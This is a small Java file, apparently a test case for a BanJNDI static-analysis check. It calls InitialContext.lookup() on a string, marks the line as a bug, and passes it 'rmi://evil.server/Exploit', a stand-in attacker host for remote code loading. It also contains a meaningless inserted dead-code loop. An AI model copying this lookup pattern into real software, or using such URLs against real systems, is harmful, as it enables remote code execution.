import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        boolean ujuuajxw = false;while (ujuuajxw && false && true && false && true && true && true && true && true && true && true && false) {char dnttznoh = 'u';}
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    
}

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}